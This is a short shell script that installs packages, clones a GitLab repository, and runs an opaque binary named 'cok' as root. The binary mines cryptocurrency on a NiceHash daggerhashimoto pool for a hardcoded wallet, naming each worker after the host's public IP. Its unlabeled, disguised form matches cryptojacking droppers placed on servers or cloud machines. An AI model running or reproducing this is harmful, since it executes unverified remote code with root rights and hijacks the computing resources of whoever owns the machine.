#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt-get install libpci3
sudo apt install screen -y
screen -dmS bismillah99.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sunmorany.git
cd sunmorany
chmod +x cok
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./cok -pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 3LCcnA4o7K2VEM3JxPC7FVQbGZTNgT7qoj.$ip -pass x -proto 4 -stales 0
